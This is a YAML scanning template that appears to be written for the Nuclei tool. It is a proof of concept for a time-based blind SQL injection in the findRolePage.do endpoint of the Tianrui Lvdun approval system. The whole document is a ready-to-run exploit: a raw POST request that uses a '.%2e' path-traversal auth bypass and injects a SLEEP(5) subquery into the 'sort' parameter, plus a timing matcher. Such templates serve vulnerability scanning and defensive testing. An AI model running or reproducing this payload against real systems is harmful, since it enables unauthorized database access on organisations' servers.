id: poc-mck2hh4f7losfg6t
info:
  name: 天锐绿盾审批系统 findRolePage.do SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - 'POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0

    Content-Type: application/x-www-form-urlencoded


    sort=id+OR+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)&order=asc'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
